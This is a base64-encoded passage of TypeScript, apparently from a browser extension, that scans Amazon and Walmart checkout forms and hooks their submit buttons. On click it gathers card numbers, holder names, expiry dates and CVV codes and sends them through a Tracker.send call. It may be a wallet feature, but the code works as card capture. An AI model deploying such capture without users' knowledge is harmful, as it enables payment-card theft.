dCc6ICdhZGQnLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHBheW1lbnRNZXRob2REYXRhID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICAvL2VsZW1lbnRzID0gW107XG4gICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgfVxuICAgICAgICB9KTtcbiAgICB9XG5cbiAgICBleHBsb3JlQmVzdFNlY3JldFBheW1lbnRGb3JtRWxlbWVudChzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBhbnksIGVsZW1lbnRzOiBhbnlbXSwgY2FsbGJhY2s6IChhcmcwOiBhbnksIGFyZzE6IGFueSkgPT4gdm9pZCkge1xuICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xuICAgICAgICAgICAgX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9jaGlsZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdTRUxFQ1QnIHx8IF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmIChfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnSU5QVVQnICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2hpZGRlbicgfHwgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdCVVRUT04nICYmICEoX2NoaWxkRWxlbWVudCBhcyBIVE1MQnV0dG9uRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdidG4tbGluaycpXG4gICAgICAgICAgICAgICAgICAgICAgICAmJiAhKF9jaGlsZEVsZW1lbnQgYXMgSFRNTEJ1dHRvbkVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygnYnRuLXNlY29uZGFyeS1hY3Rpb24nKSAmJiAoX2NoaWxkRWxlbWVudCBhcyBIVE1MQnV0dG9uRWxlbWVudCkudHlwZSA9PT0gJ3N1Ym1pdCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjYWxsYmFjaykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZUJlc3RTZWNyZXRQYXltZW50Rm9ybUVsZW1lbnQoc2VsZiwgX2NoaWxkRWxlbWVudCwgZWxlbWVudHMsIGNhbGxiYWNrKTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9KTtcbiAgICAgICAgfVxuICAgIH1cblxuICAgIGV4cGxvcmVBbWF6b25QYXltZW50Q29udGFpbmVyKHNlbGY6IHRoaXMpIHtcbiAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUVsZW1lbnQpIHtcbiAgICAgICAgICAgIGlmICghX19mb3JtRWxlbWVudC5jbGFzc0xpc3QuY29udGFpbnMoJ25hdi1zZWFyY2hiYXInKSAmJiBfX2Zvcm1FbGVtZW50Lm5hbWUgIT09ICd1ZV9iYWNrZGV0ZWN0JyAmJiBfX2Zvcm1FbGVtZW50LnN0eWxlLmRpc3BsYXkgIT09ICdub25lJykge1xuICAgICAgICAgICAgICAgIGxldCBlbGVtZW50czogYW55ID0gW107XG4gICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlQW1hem9uUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9fZm9ybUVsZW1lbnQsIGVsZW1lbnRzLCBmdW5jdGlvbiAoY29udHJvbGxlciwgZWxlbWVudHMpIHtcbiAgICAgICAgICAgICAgICAgICAgY29udHJvbGxlci5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwYXltZW50TWV0aG9kRGF0YTogYW55ID0gW107XG4gICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50cy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudDogeyBub2RlTmFtZTogYW55OyBpZDogYW55OyBuYW1lOiBhbnk7IHZhbHVlOiBhbnk7IH0pIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXltZW50TWV0aG9kRGF0YS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2NoaWxkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19jaGlsZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogX19jaGlsZEVsZW1lbnQubmFtZS5pbmRleE9mKCdhY2NvdW50SG9sZGVyTmFtZScpICE9PSAtMSB8fCBfX2NoaWxkRWxlbWVudC5uYW1lLmluZGV4T2YoJ2FjY291bnRfaG9sZGVyX25hbWUnKSAhPT0gLTEgPyAnY2FyZEhvbGRlcicgOiAoX19jaGlsZEVsZW1lbnQubmFtZS5pbmRleE9mKCdDYXJkTnVtYmVyJykgIT09IC0xID8gJ2NhcmROdW1iZXInIDogKF9fY2hpbGRFbGVtZW50Lm5hbWUuaW5kZXhPZignbW9udGgnKSAhPT0gLTEgPyAnZXhwaXJhdGlvbk1vbnRoJyA6IChfX2NoaWxkRWxlbWVudC5uYW1lLmluZGV4T2YoJ3llYXInKSAhPT0gLTEgPyAnZXhwaXJhdGlvblllYXInIDogJ1Vua25vd24nKSkpLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2NoaWxkRWxlbWVudC52YWx1ZSxcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogcGF5bWVudE1ldGhvZERhdGFbMV0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAnVW5rbm93bicsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZERhdGFbMF0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwiY2FyZEV4cGlyZVwiOiBwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSArICcvJyArIHBheW1lbnRNZXRob2REYXRhWzNdLnZhbHVlLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6ICdVbmtub3duJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZERhdGEgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICB9XG4gICAgICAgIH0pO1xuICAgIH1cblxuICAgIGV4cGxvcmVBbWF6b25QYXltZW50Rm9ybUVsZW1lbnQoc2VsZjogdGhpcywgX19mb3JtRWxlbWVudDogYW55LCBlbGVtZW50czogYW55W10sIGNhbGxiYWNrOiAoYXJnMDogYW55LCBhcmcxOiBhbnkpID0+IHZvaWQpIHtcbiAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfY2hpbGRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyB8fCBfY2hpbGRFbGVtZW50Lm5vZGVOYW1lID09PSAnU0VMRUNUJykge1xuICAgICAgICAgICAgICAgICAgICBpZiAoX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ0lOUFVUJyAmJiBfY2hpbGRFbGVtZW50LnR5cGUgIT09ICdoaWRkZW4nICYmXG4gICAgICAgICAgICAgICAgICAgICAgICBfY2hpbGRFbGVtZW50LnR5cGUgIT09ICdzdWJtaXQnICYmIF9jaGlsZEVsZW1lbnQudHlwZSAhPT0gJ2NoZWNrYm94JyB8fFxuICAgICAgICAgICAgICAgICAgICAgICAgX2NoaWxkRWxlbWVudC5ub2RlTmFtZSA9PT0gJ1NFTEVDVCcpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIGVsZW1lbnRzLnB1c2goX2NoaWxkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgaWYgKF9jaGlsZEVsZW1lbnQubm9kZU5hbWUgPT09ICdJTlBVVCcgJiYgX2NoaWxkRWxlbWVudC50eXBlID09PSAnc3VibWl0Jykge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX2NoaWxkRWxlbWVudCwgZWxlbWVudHMpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlQW1hem9uUGF5bWVudEZvcm1FbGVtZW50KHNlbGYsIF9jaGlsZEVsZW1lbnQsIGVsZW1lbnRzLCBjYWxsYmFjayk7XG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgfSk7XG4gICAgICAgIH1cbiAgICB9XG5cbiAgICBleHBsb3JlV2FsbWFydFBheW1lbnRDb250YWluZXIoc2VsZjogdGhpcykge1xuICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XG4gICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpICE9PSBudWxsICYmXG4gICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS1hY3Rpb25zJyk/LmZpcnN0RWxlbWVudENoaWxkPy5maXJzdEVsZW1lbnRDaGlsZCAhPT0gbnVsbCkge1xuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xuICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1mb3JtLWFjdGlvbnMnKT8uZmlyc3RFbGVtZW50Q2hpbGQ/LmZpcnN0RWxlbWVudENoaWxkPy5ub2RlTmFtZSA9PT0gJ0JVVFRPTicpIHtcbiAgICAgICAgICAgICAgICAgICAgW1wiY2xpY2tcIiwgXCJkYmxjbGlja1wiXS5mb3JFYWNoKGZ1bmN0aW9uIChldmVudCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlOiBhbnkgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWZvcm0tYWN0aW9ucycpPy5maXJzdEVsZW1lbnRDaGlsZD8uZmlyc3RFbGVtZW50Q2hpbGQ/LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWZvcm0ubXVsdGlwbGUtcmVxdWlyZWQnKSBhcyBIVE1MRWxlbWVudCksICdjcmVkaXRDYXJkJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5wYXltZW50LW9wdGlvbicpLmZvckVhY2goZnVuY3Rpb24gKGVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCFlbGVtZW50LmNsYXNzTGlzdC5jb250YWlucygncGF5bWVudC1pbmFjdGl2ZScpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ3BheW1lbnQtb3B0aW9uJyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IGVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogJ2NhcmRCcmFuZCcsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZWxlbWVudC5jbGFzc05hbWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxlbWVudC5jbGFzc0xpc3QuYWRkKCdwYXltZW50LW9wdGlvbicpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG5cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50SW5wdXRUYWcoc2VsZiwgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5lZGl0LWZvcm0ubXVsdGlwbGUtcmVxdWlyZWQnKSBhcyBIVE1MRWxlbWVudCksICdmaXJzdE5hbWUnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZS5wdXNoKHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdlbGVtZW50JzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnaWQnOiBfX2RldGVjdGVkRWxlbWVudC5pZCxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpIGFzIEhUTUxFbGVtZW50KSwgJ2xhc3ROYW1lJywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVQYXltZW50U2VsZWN0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1mb3JtLm11bHRpcGxlLXJlcXVpcmVkJykgYXMgSFRNTEVsZW1lbnQpLCAnbW9udGgtY2hvb3NlcicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudFNlbGVjdFRhZyhzZWxmLCAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtZm9ybS5tdWx0aXBsZS1yZXF1aXJlZCcpIGFzIEhUTUxFbGVtZW50KSwgJ3llYXItY2hvb3NlcicsIGZ1bmN0aW9uIChfX2RldGVjdGVkRWxlbWVudDogYW55KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBQYXltZW50TWV0aG9kc1N0b3JlLnB1c2goe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBfX2RldGVjdGVkRWxlbWVudC5ub2RlTmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdpZCc6IF9fZGV0ZWN0ZWRFbGVtZW50LmlkLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogX19kZXRlY3RlZEVsZW1lbnQudmFsdWVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlUGF5bWVudElucHV0VGFnKHNlbGYsIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuZWRpdC1mb3JtLm11bHRpcGxlLXJlcXVpcmVkJykgYXMgSFRNTEVsZW1lbnQpLCAnY3Z2JywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUucHVzaCh7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZWxlbWVudCc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogX19kZXRlY3RlZEVsZW1lbnQuaWQsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZVBheW1lbnRNZXRob2RzRGF0YScsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkTnVtYmVyJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMF0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbMV0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IHRlbXBQYXltZW50TWV0aG9kc1N0b3JlWzJdLnZhbHVlICsgJyAnICsgdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbM10udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcImNhcmRFeHBpcmVcIjogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbNF0udmFsdWUgKyAnLycgKyB0ZW1wUGF5bWVudE1ldGhvZHNTdG9yZVs1XS52YWx1ZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogdGVtcFBheW1lbnRNZXRob2RzU3RvcmVbNl0udmFsdWUsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnZXZlbnQnOiAnYWRkJyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdGVtcFBheW1lbnRNZXRob2RzU3RvcmUgPSBbXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVXYWxtYXJ0UGF5bWVudEVkaXRCdXR0b24oc2VsZik7XG4gICAgICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfSwgMTAwKTtcbiAgICB9XG5cbiAgICBleHBsb3JlV2FsbWFydFBheW1lbnRFZGl0QnV0dG9uKHNlbGY6IHRoaXMpIHtcbiAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5idXR0b24ubGluay5DWE9fbW9kdWxlX2hlYWRlcl9lZGl0X2J1dHRvbi5idXR0b24tLWxpbmsnKS5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcuYnV0dG9uLmxpbmsuQ1hPX21vZHVsZV9oZWFkZXJfZWRpdF9idXR0b24uYnV0dG9uLS1saW5rJykuZm9yRWFjaChmdW5jdGlvbiAoZm9ybUVkaXRCdXR0b24pIHtcbiAgICAgICAgICAgICAgICAgICAgaWYgKGZvcm1FZGl0QnV0dG9uLmdldEF0dHJpYnV0ZSgnZGF0YS1hdXRvbWF0aW9uLWlkJykgPT09ICdlZGl0LXBheW1lbnQnKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGZvcm1FZGl0QnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVdhbG1hcnRQYXltZW50Q29udGFpbmVyKHNlbGYpO1xuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9KVxuICAgICAgICAgICAgfVxuICAgICAgICB9LCAxMDApO1xuICAgIH1cblxuICAgIGV4cGxvcmVQYXltZW50TmV3Q2FyZChzZWxmOiB0aGlzLCBlbGVtZW50UGFyZW50Tm9kZTogSFRNTEVsZW1lbnQsIGNhbGxiYWNrPzogYW55KSB7XG4gICAgICAgIGxldCBkZXRlY3RlZEVsZW1lbnRzOiBhbnlbXSA9IFtdO1xuICAgICAgICBpZiAoZWxlbWVudFBhcmVudE5vZGUuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcbiAgICAgICAgICAgIGVsZW1lbnRQYXJlbnROb2RlLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQpIHtcbiAgICAgICAgICAgICAgICBpZiAoKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2NhcmQtc3VyZmFjZScpKSB7XG4gICAgICAgICAgICAgICAgICAgIGlmICgoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lID09PSAnRElWJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX190YXJnZXRQYXJlbnRFbGVtZW50KSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygnY2FyZC1ubycpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoX190YXJnZXRQYXJlbnRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgJ2NhcmRObycsIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoKF9fdGFyZ2V0UGFyZW50RWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdjYXJkLWJvdHRvbScpKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVBheW1lbnRJbnB1dFRhZyhzZWxmLCAoX190YXJnZXRQYXJlbnRFbGVtZW50IGFzIEhUTUxFbGVtZW50KSwgJ2NhcmRIb2xkZXInLCBmdW5jdGlvbiAoZGV0ZWN0ZWR